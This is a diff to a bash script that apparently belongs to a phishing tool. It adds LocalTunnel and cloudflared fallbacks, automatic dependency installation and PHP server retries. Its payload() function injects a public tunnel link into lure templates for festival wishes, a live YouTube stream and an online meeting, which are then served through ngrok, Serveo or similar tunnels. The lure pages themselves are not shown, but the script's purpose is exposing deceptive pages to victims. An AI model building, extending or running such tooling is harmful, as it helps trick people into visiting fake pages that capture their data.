@@ -8,6 +8,69 @@ trap 'printf "\n";stop' 2
 
 # ============================================================================
 # Platform detection
+try_localtunnel() {
+	printf "\e[1;92m[+] Attempting LocalTunnel (npx/localtunnel)...\e[0m\n"
+	if has_cmd lt; then
+		LT_CMD="lt"
+	elif has_cmd npx; then
+		LT_CMD="npx localtunnel"
+	else
+		printf "\e[1;93m[!] localtunnel (lt) or npx not available\e[0m\n"
+		return 1
+	fi
+
+	pkill -f "localtunnel" 2>/dev/null || true
+	$LT_CMD --port 3333 > localtunnel.log 2>&1 &
+	local lt_pid=$!
+
+	local elapsed=0
+	while [[ $elapsed -lt 8 ]]; do
+		sleep 1
+		elapsed=$((elapsed+1))
+		if grep -q "your url is" localtunnel.log 2>/dev/null; then
+			local url=$(grep -o "https://[a-z0-9.-]*\.loc\.lt\|https://[a-z0-9.-]*\.localtunnel\.me" localtunnel.log | head -n1 || true)
+			if [[ -n "$url" ]]; then
+				printf "\e[1;92m[✓] LocalTunnel ready: $url\e[0m\n"
+				echo "$url"
+				return 0
+			fi
+		fi
+	done
+
+	printf "\e[1;93m[!] LocalTunnel timeout or failed\e[0m\n"
+	kill $lt_pid 2>/dev/null || true
+	return 1
+}
+
+try_cloudflared() {
+	printf "\e[1;92m[+] Attempting Cloudflare Tunnel (cloudflared)...\e[0m\n"
+	if ! has_cmd cloudflared; then
+		printf "\e[1;93m[!] cloudflared not installed\e[0m\n"
+		return 1
+	fi
+
+	pkill -f "cloudflared" 2>/dev/null || true
+	cloudflared tunnel --url http://127.0.0.1:3333 > cloudflared.log 2>&1 &
+	local cf_pid=$!
+
+	local elapsed=0
+	while [[ $elapsed -lt 8 ]]; do
+		sleep 1
+		elapsed=$((elapsed+1))
+		# cloudflared prints the public url in logs
+		local url=$(grep -o "https://[a-z0-9.-]*" cloudflared.log | head -n1 || true)
+		if [[ -n "$url" ]]; then
+			printf "\e[1;92m[✓] cloudflared ready: $url\e[0m\n"
+			echo "$url"
+			return 0
+		fi
+	done
+
+	printf "\e[1;93m[!] cloudflared timeout or failed\e[0m\n"
+	kill $cf_pid 2>/dev/null || true
+	return 1
+}
+
 # ============================================================================
 PLATFORM="$(uname -s 2>/dev/null || echo Unknown)"
 IS_DARWIN=false
@@ -107,6 +170,138 @@ dependencies() {
 		exit 1
 	fi
 	printf "\e[1;92m[✓] Dependencies OK\e[0m\n"
+}
+
+# ============================================================================
+# Auto-install missing dependencies across platforms
+# ============================================================================
+auto_install_dependencies() {
+	printf "\n\e[1;92m[*] Checking recommended dependencies and optional tools...\e[0m\n"
+
+	# Lists of checks
+	apt_pkgs=(php openssh-client openssh-server git wget espeak alsa-utils)
+	pip_pkgs=(pyttsx3 colorama openpyxl uno systemd)
+	other_bins=(cloudflared)
+
+	missing_apt=()
+	missing_pip=()
+	missing_bin=()
+
+	# Check basic binaries
+	for pkg in "${apt_pkgs[@]}"; do
+		case "$pkg" in
+			php) has_cmd php || missing_apt+=(php) ;;
+			openssh-client|openssh-server)
+				has_cmd ssh || missing_apt+=(openssh-client) ;;
+			git) has_cmd git || missing_apt+=(git) ;;
+			wget) has_cmd wget || missing_apt+=(wget) ;;
+			espeak) has_cmd espeak || missing_apt+=(espeak) ;;
+			alsa-utils) has_cmd aplay || missing_apt+=(alsa-utils) ;;
+			*) ;;
+		esac
+	done
+
+	# Check python packages
+	PY_CMD=""
+	if has_cmd python3; then PY_CMD=python3; elif has_cmd python; then PY_CMD=python; fi
+	for p in "${pip_pkgs[@]}"; do
+		if [[ -n "$PY_CMD" ]]; then
+			$PY_CMD -c "import ${p}" >/dev/null 2>&1 || missing_pip+=("$p")
+		else
+			missing_pip+=("$p")
+		fi
+	done
+
+	# Check other binaries
+	for b in "${other_bins[@]}"; do
+		has_cmd $b || missing_bin+=("$b")
+	done
+
+	if [[ ${#missing_apt[@]} -eq 0 && ${#missing_pip[@]} -eq 0 && ${#missing_bin[@]} -eq 0 ]]; then
+		printf "\e[1;92m[✓] All recommended tools appear present\e[0m\n"
+		return 0
+	fi
+
+	printf "\n\e[1;93m[!] Missing components detected:\e[0m\n"
+	if [[ ${#missing_apt[@]} -gt 0 ]]; then printf "  - apt packages: %s\n" "${missing_apt[*]}"; fi
+	if [[ ${#missing_pip[@]} -gt 0 ]]; then printf "  - pip packages: %s\n" "${missing_pip[*]}"; fi
+	if [[ ${#missing_bin[@]} -gt 0 ]]; then printf "  - other binaries: %s\n" "${missing_bin[*]}"; fi
+
+	# If called with 'auto' parameter, run non-interactively (assume yes)
+	if [[ "$1" == "auto" ]]; then
+		reply="Y"
+	else
+		printf "\nDo you want to attempt automatic installation now? [Y/n]: "
+		read reply
+		reply="${reply:-Y}"
+	fi
+	if [[ "$reply" =~ ^[Nn]$ ]]; then
+		printf "\e[1;93m[!] Skipping automatic install as requested\e[0m\n"
+		return 1
+	fi
+
+	# Determine package manager
+	SUDO=""
+	if has_cmd sudo; then SUDO=sudo; fi
+
+	if has_cmd apt-get; then
+		PKG_CMD="$SUDO apt-get -y install"
+	elif has_cmd pkg && grep -qi "com.termux" /proc/self/cgroup 2>/dev/null; then
+		PKG_CMD="pkg install -y"
+	elif has_cmd pacman; then
+		PKG_CMD="$SUDO pacman -S --noconfirm"
+	elif has_cmd yum; then
+		PKG_CMD="$SUDO yum -y install"
+	elif has_cmd brew; then
+		PKG_CMD="brew install"
+	elif $IS_WINDOWS; then
+		if has_cmd choco; then
+			PKG_CMD="choco install -y"
+		else
+			printf "\e[1;31m[!] No supported system package manager found on Windows (choco). Please install Chocolatey or run installs manually.\e[0m\n"
+			PKG_CMD=""
+		fi
+	else
+		PKG_CMD=""
+	fi
+
+	# Install apt-style packages
+	if [[ -n "$PKG_CMD" && ${#missing_apt[@]} -gt 0 ]]; then
+		printf "\e[1;92m[+] Installing system packages: %s\e[0m\n" "${missing_apt[*]}"
+		$PKG_CMD ${missing_apt[*]} 2>&1 | tee -a install.log || printf "\e[1;31m[!] System package install may have failed - check install.log\e[0m\n"
+	else
+		if [[ ${#missing_apt[@]} -gt 0 ]]; then
+			printf "\e[1;93m[!] Cannot auto-install system packages on this platform. Please install: %s\e[0m\n" "${missing_apt[*]}"
+		fi
+	fi
+
+	# Install pip packages
+	if has_cmd pip3; then PIP_CMD="pip3"; elif has_cmd pip; then PIP_CMD="pip"; else PIP_CMD=""; fi
+	if [[ -n "$PIP_CMD" && ${#missing_pip[@]} -gt 0 ]]; then
+		printf "\e[1;92m[+] Installing Python packages: %s\e[0m\n" "${missing_pip[*]}"
+		$PIP_CMD install --user ${missing_pip[*]} 2>&1 | tee -a install.log || printf "\e[1;31m[!] pip install may have failed - check install.log\e[0m\n"
+	else
+		if [[ ${#missing_pip[@]} -gt 0 ]]; then
+			printf "\e[1;93m[!] pip not available - cannot install Python packages automatically: %s\e[0m\n" "${missing_pip[*]}"
+		fi
+	fi
+
+	# Try to install other binaries minimally
+	for b in "${missing_bin[@]}"; do
+		if [[ "$b" == "cloudflared" ]]; then
+			if has_cmd apt-get; then
+				printf "\e[1;92m[+] Installing cloudflared (apt)...\e[0m\n"
+				$SUDO apt-get -y install cloudflared 2>&1 | tee -a install.log || printf "\e[1;93m[!] cloudflared package may not be in apt repos; see https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/\e[0m\n"
+			elif has_cmd choco; then
+				printf "\e[1;92m[+] Installing cloudflared via choco...\e[0m\n"
+				choco install -y cloudflared 2>&1 | tee -a install.log || true
+			else
+				printf "\e[1;93m[!] Please install cloudflared manually. See: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/\e[0m\n"
+			fi
+		fi
+	done
+
+	printf "\e[1;92m[✓] Auto-install attempt finished. Review install.log for details.\e[0m\n"
 }
 
 # ============================================================================
@@ -449,20 +644,23 @@ select_template() {
 }
 
 payload() {
-	link_esc=$(printf '%s' "$1" | sed 's/[&]/\\&/g')
-	sed 's+forwarding_link+'"$link_esc"'+g' template.php > index.php
+	# Properly escape special characters for sed replacement
+	# Use | as delimiter to avoid conflicts with URLs containing +
+	link_esc=$(printf '%s\n' "$1" | sed -e 's/[\/&]/\\&/g')
+	
+	sed -e "s|forwarding_link|$link_esc|g" template.php > index.php
 	
 	case $option_tem in
 		1)
-			sed 's+forwarding_link+'"$link_esc"'+g' festivalwishes.html > index3.html
-			sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
+			sed -e "s|forwarding_link|$link_esc|g" festivalwishes.html > index3.html
+			sed -e "s|fes_name|$fest_name|g" index3.html > index2.html
 			;;
 		2)
-			sed 's+forwarding_link+'"$link_esc"'+g' LiveYTTV.html > index3.html
-			sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+			sed -e "s|forwarding_link|$link_esc|g" LiveYTTV.html > index3.html
+			sed -e "s|live_yt_tv|$yt_video_ID|g" index3.html > index2.html
 			;;
 		3)
-			sed 's+forwarding_link+'"$link_esc"'+g' OnlineMeeting.html > index2.html
+			sed -e "s|forwarding_link|$link_esc|g" OnlineMeeting.html > index2.html
 			;;
 	esac
 	rm -f index3.html
@@ -489,6 +687,13 @@ main() {
 		printf "\e[1;93m╚════════════════════════════════════════════════════════════╝\e[0m\n"
 		printf "\n"
 		sleep 3
+	fi
+
+	# Auto-install missing dependencies automatically unless NO_AUTO_INSTALL is set
+	if [[ -z "$NO_AUTO_INSTALL" ]]; then
+		auto_install_dependencies auto || true
+	else
+		printf "\e[1;93m[!] Skipping automatic dependency installation (NO_AUTO_INSTALL set)\e[0m\n"
 	fi
 
 	printf "\n\e[1;92m[*] Auto-setup mode\e[0m\n"
@@ -531,22 +736,50 @@ main() {
 		printf "\e[1;31m[!] PHP failed to start\e[0m\n"
 		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
 		cat php.log || true
-		stop
+		return 1
 	fi
 	
 	printf "\e[1;92m[✓] PHP server running\e[0m\n"
 	# Quick network check before trying tunnels
 	printf "\n\e[1;92m[*] Network diagnostics...\e[0m\n"
 	
-	# Check if PHP is actually listening
-	printf "\e[1;92m[+] Checking PHP on 0.0.0.0:3333...\e[0m\n"
-	if curl -s --max-time 1 http://127.0.0.1:3333/index.php >/dev/null 2>&1; then
-		printf "\e[1;92m[✓] PHP is responding\e[0m\n"
-	else
-		printf "\e[1;31m[!] ERROR: PHP not responding on 127.0.0.1:3333\e[0m\n"
-		printf "\e[1;93m[DEBUG] PHP log:\e[0m\n"
-		head -20 php.log || true
-		stop
+	# Check if PHP is actually listening (retry multiple addresses)
+	printf "\e[1;92m[+] Checking PHP on $PHP_BIND:3333...\e[0m\n"
+	local php_ok=0
+	for host in 127.0.0.1 0.0.0.0; do
+		for try in 1 2 3; do
+			if curl -s --max-time 1 "http://$host:3333/index.php" >/dev/null 2>&1; then
+				printf "\e[1;92m[✓] PHP is responding on $host:3333\e[0m\n"
+				php_ok=1
+				break 2
+			fi
+			printf "."
+			sleep 1
+		done
+	done
+
+	if [[ $php_ok -ne 1 ]]; then
+		printf "\n\e[1;31m[!] ERROR: PHP not responding on local interfaces\e[0m\n"
+		printf "\e[1;93m[DEBUG] php.log:\e[0m\n"
+		tail -40 php.log || true
+		printf "\e[1;93m[!] Attempting to restart PHP bound to 0.0.0.0 and retry...\e[0m\n"
+		pkill -f "php -S" 2>/dev/null || true
+		php -S 0.0.0.0:3333 > php.log 2>&1 < /dev/null &
+		sleep 1
+		for try in 1 2 3; do
+			if curl -s --max-time 1 "http://0.0.0.0:3333/index.php" >/dev/null 2>&1; then
+				printf "\e[1;92m[✓] PHP is responding after restart on 0.0.0.0:3333\e[0m\n"
+				php_ok=1
+				break
+			fi
+			printf "."
+			sleep 1
+		done
+		if [[ $php_ok -ne 1 ]]; then
+			printf "\n\e[1;31m[!] ERROR: PHP still not responding\e[0m\n"
+			tail -40 php.log || true
+			return 1
+		fi
 	fi
 	
 	# Check internet connectivity
@@ -557,23 +790,68 @@ main() {
 		printf "\e[1;93m[!] WARNING: No internet or slow connection\e[0m\n"
 		printf "\e[1;93m    Ngrok/Serveo may fail\e[0m\n"
 	fi
-	# Try ngrok first (unless in WSL), then Serveo
+	# Try tunneling methods with user selection + fallback
 	printf "\n\e[1;92m[*] Obtaining public link...\e[0m\n"
 	local link=""
-	
-	# In WSL, skip ngrok and use Serveo directly (better networking)
-	if is_wsl; then
-		printf "\e[1;93m[!] WSL detected - using Serveo tunnel (better networking)\e[0m\n"
-		link=$(try_serveo)
-	else
-		printf "\e[1;92m[+] Attempting ngrok tunnel...\e[0m\n"
-		link=$(try_ngrok) 
-		
-		if [[ -z "$link" ]]; then
-			printf "\e[1;92m[+] ngrok failed, attempting Serveo fallback...\e[0m\n"
-			link=$(try_serveo)
-		fi
+
+	# Prompt user for preferred tunnel method
+	printf "\nChoose tunnel preference:\n"
+	printf "  [1] ngrok (recommended)\n"
+	printf "  [2] LocalTunnel (npx/localtunnel)\n"
+	printf "  [3] Cloudflared (cloudflared)\n"
+	printf "  [4] Serveo (ssh)\n"
+	printf "  [5] Auto (ngrok -> localtunnel -> cloudflared -> serveo) [default]\n"
+	printf "\nEnter choice [5]: "
+	read tunnel_choice
+	tunnel_choice="${tunnel_choice:-5}"
+
+	# Build try order based on choice
+	tunnels=()
+	case "$tunnel_choice" in
+		1) tunnels=(ngrok localtunnel cloudflared serveo) ;; 
+		2) tunnels=(localtunnel ngrok cloudflared serveo) ;; 
+		3) tunnels=(cloudflared ngrok localtunnel serveo) ;; 
+		4) tunnels=(serveo ngrok localtunnel cloudflared) ;; 
+		*) tunnels=(ngrok localtunnel cloudflared serveo) ;;
+	esac
+
+	# If WSL, prefer Serveo first unless user explicitly chose another
+	if is_wsl && [[ "$tunnel_choice" == "5" ]]; then
+		tunnels=(serveo ngrok localtunnel cloudflared)
+		printf "\e[1;93m[!] WSL detected - defaulting to Serveo first\e[0m\n"
 	fi
+
+	# Try each tunnel in sequence until one returns a link
+	for t in "${tunnels[@]}"; do
+		case "$t" in
+			ngrok)
+				printf "\e[1;92m[+] Attempting ngrok tunnel...\e[0m\n"
+				link=$(try_ngrok)
+				rc=$?
+				;;
+			localtunnel)
+				printf "\e[1;92m[+] Attempting LocalTunnel...\e[0m\n"
+				link=$(try_localtunnel)
+				rc=$?
+				;;
+			cloudflared)
+				printf "\e[1;92m[+] Attempting cloudflared...\e[0m\n"
+				link=$(try_cloudflared)
+				rc=$?
+				;;
+			serveo)
+				printf "\e[1;92m[+] Attempting Serveo...\e[0m\n"
+				link=$(try_serveo)
+				rc=$?
+				;;
+			*) rc=1 ;;
+		esac
+
+		if [[ $rc -eq 0 && -n "$link" ]]; then
+			break
+		fi
+		# otherwise continue to next
+	done
 
 	if [[ -z "$link" ]]; then
 		printf "\e[1;31m[!] All tunneling methods failed\e[0m\n"
